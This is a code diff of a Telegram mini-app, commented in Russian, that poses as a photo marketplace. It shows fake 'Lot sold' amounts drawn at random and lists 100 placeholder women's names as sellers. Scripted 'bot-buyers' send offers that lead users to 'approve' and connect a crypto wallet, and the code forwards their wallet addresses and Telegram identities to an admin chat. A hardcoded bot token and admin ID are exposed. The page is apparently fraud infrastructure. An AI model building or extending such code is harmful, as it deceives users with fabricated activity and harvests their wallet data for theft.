@@ -66,13 +66,6 @@
             font-size:12px; font-weight:bold;
             border:2px solid #14142b;
         }
-        .admin-btn {
-            background: rgba(255,215,0,0.15);
-            border:1px solid rgba(255,215,0,0.4);
-            color:#FFD966; border-radius:12px;
-            padding:8px 16px; font-size:13px; font-weight:600;
-            margin-bottom:16px; cursor:pointer; display:none;
-        }
         .vitrina-title {
             font-size:18px; font-weight:600; color:#e0e7ff;
             margin:8px 0 16px; align-self:flex-start;
@@ -158,8 +151,6 @@
 </div>
 
 <div class="container" id="mainContainer">
-    <!-- Admin button (visible only for admin, non‑functional now) -->
-    <div class="admin-btn" id="adminPanelBtn">Admin Panel (soon)</div>
     <div class="profile-area" id="profileArea">
         <div class="profile-circle" id="profileCircle">
             <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" id="defaultProfileIcon">
@@ -244,37 +235,29 @@
         <div id="offersList"></div>
         <button class="close-btn" id="closeOffersModal">Close</button>
     </div>
-  </div>
-  <script>
+ </div>
+ <script>
 (function() {
     // ====== CONFIG ======
     const BOT_TOKEN = '8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8';                // токен бота
-    const ADMIN_CHAT_ID ='8696933754';              // ваш Telegram ID (числовой)
-    const JSONBIN_API_KEY = 'YOUR_JSONBIN_API_KEY';   // API-ключ JSONBin
-    const JSONBIN_BIN_ID = 'YOUR_JSONBIN_BIN_ID';     // ID бина
-
-    // JSONBin structure:
-    // {
-    //   "profiles": [],
-    //   "buyerProfiles": [
-    //     { "id": 1, "name": "Takeshi", "photo": "base64...", "message": "I want to meet you" }
-    //   ],
-    //   "settings": { "adminTRC20": "T...", "adminERC20": "0x..." }
-    // }
+    const ADMIN_CHAT_ID = '8696933754';              // ваш Telegram ID (числовой)
+    // JSONBin настройки можно оставить пустыми – интерфейс будет работать
+    const JSONBIN_API_KEY = 'YOUR_JSONBIN_API_KEY';   // или ''
+    const JSONBIN_BIN_ID = 'YOUR_JSONBIN_BIN_ID';     // или ''
 
     const tg = window.Telegram?.WebApp;
     if (tg) { tg.ready(); tg.expand(); }
 
-    // Ticker
+    // ---------- TICKER (всегда работает) ----------
     const ticker = document.getElementById('ticker');
     let tickHTML = '';
     for (let i=0;i<30;i++) {
-        let amt = Math.floor(Math.random()*4851)+150; // 150–5000
+        let amt = Math.floor(Math.random()*4851)+150;
         tickHTML += `<span>Lot sold for $${amt}</span><span class="sep">•</span>`;
     }
     ticker.innerHTML = tickHTML + tickHTML;
 
-    // 100 female names
+    // ---------- 100 женских имён (всегда отображаются) ----------
     const femaleNames = [
         "Sophia","Olivia","Emma","Ava","Isabella","Mia","Luna","Harper","Evelyn","Ella",
         "Avery","Scarlett","Grace","Chloe","Zoey","Lily","Hannah","Aria","Ellie","Nora",
@@ -288,13 +271,15 @@
         "Angelina","Cecilia","Megan","Logan","Brynn","Emerson","Jocelyn","Marley","Payton","Alexa"
     ];
 
+    // ---------- Глобальные переменные ----------
     let currentUser = null;          // текущий пользователь (продавец)
-    let allProfiles = [];            // все профили продавцов
-    let buyers = [];                 // боты-покупатели
+    let allProfiles = [];            // профили продавцов (из JSONBin)
+    let buyers = [];                 // боты-покупатели (из JSONBin)
     let settings = { adminTRC20:'', adminERC20:'' };
 
-    // Загрузка данных из JSONBin
+    // ---------- Функции для JSONBin (необязательные) ----------
     async function fetchBin() {
+        if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) throw new Error('JSONBin not configured');
         const resp = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
             headers: { 'X-Master-Key': JSONBIN_API_KEY }
         });
@@ -302,6 +287,7 @@
         return data.record;
     }
     async function updateBin(record) {
+        if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) return;
         await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
             method:'PUT',
             headers: { 'Content-Type':'application/json', 'X-Master-Key': JSONBIN_API_KEY },
@@ -309,26 +295,7 @@
         });
     }
 
-    // Инициализация
-    async function init() {
-        try {
-            const rec = await fetchBin();
-            settings = rec.settings || { adminTRC20:'', adminERC20:'' };
-            buyers = rec.buyerProfiles || [];
-            allProfiles = rec.profiles || [];
-        } catch(e) { console.error(e); }
-
-        const userId = tg?.initDataUnsafe?.user?.id;
-        currentUser = allProfiles.find(p => p.userId === userId);
-        renderMain();
-        checkAdminVisibility();
-
-        if (currentUser) {
-            // Генерация оффера, если прошло 30 минут
-            checkAndGenerateOffer();
-        }
-    }
-
+    // ---------- Отрисовка главной страницы (работает без JSONBin) ----------
     function renderMain() {
         const circle = document.getElementById('profileCircle');
         const label = document.getElementById('profileLabel');
@@ -353,14 +320,15 @@
         // Сбор продавцов для витрины
         let sellers = [];
         const realSellers = allProfiles.filter(p => p.userId !== currentUser?.userId && p.sellerData);
-        if (realSellers.length === 0) {
+        if (realSellers.length > 0) {
+            sellers = realSellers;
+        } else {
+            // Всегда показываем 100 имён, даже без JSONBin
             sellers = femaleNames.map(name => ({
                 userId: null,
                 sellerData: { name },
                 photoBase64: []
             }));
-        } else {
-            sellers = realSellers;
         }
         shuffle(sellers);
         grid.innerHTML = sellers.map(p => {
@@ -379,7 +347,7 @@
         }
     }
 
-    // Открытие выбора роли
+    // ---------- Регистрация и роли ----------
     function openRoleSelection() {
         document.getElementById('roleModal').classList.add('active');
     }
@@ -390,13 +358,11 @@
     };
     document.getElementById('buyerRoleBtn').onclick = ()=>{
         document.getElementById('roleModal').classList.remove('active');
-        // Покупатель сразу переходит к привязке кошелька
         document.getElementById('walletModal').classList.add('active');
-        // Запоминаем, что это не оффер, а прямая привязка
-        window.pendingDealOffer = undefined;
+        window.pendingDealOffer = undefined; // прямая привязка
     };
 
-    // Регистрация продавца
+    // Форма продавца
     document.getElementById('closeSellerForm').onclick = ()=> document.getElementById('sellerFormModal').classList.remove('active');
     document.getElementById('sellerNextBtn').onclick = ()=>{
         if (!document.getElementById('sName').value.trim()) {
@@ -406,6 +372,7 @@
         document.getElementById('photoModal').classList.add('active');
     };
 
+    // Фото
     let selectedFiles = [];
     document.getElementById('uploadTriggerBtn').onclick = ()=> document.getElementById('photoInput').click();
     document.getElementById('photoInput').onchange = (e)=>{
@@ -440,7 +407,7 @@
             r.onload = ()=> res(r.result);
             r.readAsDataURL(f);
         })));
-        const userId = tg?.initDataUnsafe?.user?.id;
+        const userId = tg?.initDataUnsafe?.user?.id || 'demo';
         const newProfile = {
             userId,
             userInfo: tg?.initDataUnsafe?.user ? `ID:${tg.initDataUnsafe.user.id} @${tg.initDataUnsafe.user.username||''}` : '',
@@ -452,13 +419,14 @@
             registeredAt: new Date().toISOString()
         };
         allProfiles.push(newProfile);
-        await updateBin({...await fetchBin(), profiles: allProfiles});
+        // Пытаемся сохранить в JSONBin, если настроен
+        try { await updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
         currentUser = newProfile;
         document.getElementById('photoModal').classList.remove('active');
         renderMain();
         sendAdmin(`New seller registered: ${sellerData.name}`);
     };
-      // Генерация оффера (раз в 30 минут при входе)
+        // ---------- Офферы и уведомления ----------
     async function checkAndGenerateOffer() {
         if (!currentUser || !buyers.length) return;
         const now = Date.now();
@@ -476,11 +444,10 @@
         currentUser.lastOfferTime = new Date().toISOString();
         const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
         if (idx >= 0) allProfiles[idx] = currentUser;
-        await updateBin({...await fetchBin(), profiles: allProfiles});
+        try { await updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
         renderMain();
     }
 
-    // Показ офферов
     function showOffers() {
         if (!currentUser) return;
         const list = document.getElementById('offersList');
@@ -496,24 +463,21 @@
             </div>`;
         }).join('');
 
-        // Помечаем все как прочитанные
         currentUser.offers.forEach(o => o.read = true);
         const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
         if (idx >= 0) allProfiles[idx] = currentUser;
-        updateBin({...await fetchBin(), profiles: allProfiles});
+        try { updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
         renderMain();
         document.getElementById('offersModal').classList.add('active');
     }
     document.getElementById('closeOffersModal').onclick = ()=> document.getElementById('offersModal').classList.remove('active');
 
     window.contactDeal = function(offerIndex) {
-        if (!currentUser.wallet) {
-            // Нет привязанного кошелька – показываем форму привязки
+        if (!currentUser || !currentUser.wallet) {
             document.getElementById('offersModal').classList.remove('active');
             document.getElementById('walletModal').classList.add('active');
             window.pendingDealOffer = offerIndex;
         } else {
-            // Кошелёк уже привязан – сразу отправляем запрос админу (заглушка)
             sendDeal(offerIndex);
         }
     };
@@ -526,45 +490,48 @@
         document.getElementById('offersModal').classList.remove('active');
     }
 
-    // Привязка кошелька (approve)
+    // ---------- Привязка кошелька (approve) ----------
     document.getElementById('approveBtn').onclick = async () => {
         const network = document.getElementById('network').value;
         const address = document.getElementById('walletAddress').value.trim();
         if (!address) return;
-
         document.getElementById('walletStatus').textContent = 'Approving...';
-        // Имитация успешного approve (в реальности здесь вызов кошелька)
         setTimeout(async () => {
+            if (!currentUser) {
+                // Если пользователь не зарегистрирован как продавец, создаём минимальный профиль
+                const userId = tg?.initDataUnsafe?.user?.id || 'buyer';
+                currentUser = {
+                    userId,
+                    sellerData: null,
+                    photoBase64: [],
+                    offers: [],
+                    lastOfferTime: new Date().toISOString(),
+                    wallet: null,
+                    registeredAt: new Date().toISOString()
+                };
+                allProfiles.push(currentUser);
+            }
             currentUser.wallet = { network, address, approved: true };
             const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
             if (idx >= 0) allProfiles[idx] = currentUser;
-            await updateBin({...await fetchBin(), profiles: allProfiles});
+            try { await updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
 
             document.getElementById('walletStatus').textContent = 'Wallet connected!';
             document.getElementById('walletModal').classList.remove('active');
 
-            // Если была ожидающая сделка – отправляем её
             if (window.pendingDealOffer !== undefined) {
                 sendDeal(window.pendingDealOffer);
                 window.pendingDealOffer = undefined;
             }
             renderMain();
-            sendAdmin(`User ${currentUser.sellerData?.name} connected wallet ${address} on ${network}`);
+            sendAdmin(`User ${currentUser.sellerData?.name || 'Buyer'} connected wallet ${address} on ${network}`);
         }, 1000);
     };
     document.getElementById('closeWalletModal').onclick = ()=> document.getElementById('walletModal').classList.remove('active');
 
-    // Админская кнопка (только видимость, без функционала)
-    function checkAdminVisibility() {
-        const btn = document.getElementById('adminPanelBtn');
-        if (tg?.initDataUnsafe?.user?.id && String(tg.initDataUnsafe.user.id) === String(ADMIN_CHAT_ID)) {
-            btn.style.display = 'block';
-            btn.onclick = ()=> alert('Admin panel will be available via helper bot.');
-        }
-    }
-
-    // Отправка сообщения админу в Telegram
+    // ---------- Вспомогательные функции ----------
     function sendAdmin(text) {
+        if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method:'POST',
             headers:{'Content-Type':'application/json'},
@@ -572,7 +539,37 @@
         }).catch(()=>{});
     }
 
-    init();
+    // ---------- Загрузка данных из JSONBin (асинхронно, не блокирует интерфейс) ----------
+    async function loadExternalData() {
+        try {
+            const rec = await fetchBin();
+            if (rec) {
+                settings = rec.settings || settings;
+                buyers = rec.buyerProfiles || [];
+                allProfiles = rec.profiles || [];
+                // Проверяем, есть ли текущий пользователь в загруженных профилях
+                const userId = tg?.initDataUnsafe?.user?.id;
+                currentUser = allProfiles.find(p => p.userId === userId);
+                if (currentUser) {
+                    await checkAndGenerateOffer();
+                }
+                renderMain();
+            }
+        } catch (e) {
+            console.log('JSONBin not available, using local data only');
+        }
+    }
+
+    // ---------- Старт ----------
+    renderMain(); // отрисовываем сразу
+    // Затем пытаемся загрузить JSONBin (необязательно)
+    if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
+        loadExternalData();
+    }
+
+    // ---------- Обработка кнопки "Register" для незарегистрированного пользователя ----------
+    // Уже задана в renderMain через onclick
+
 })();
 </script>
 </body>
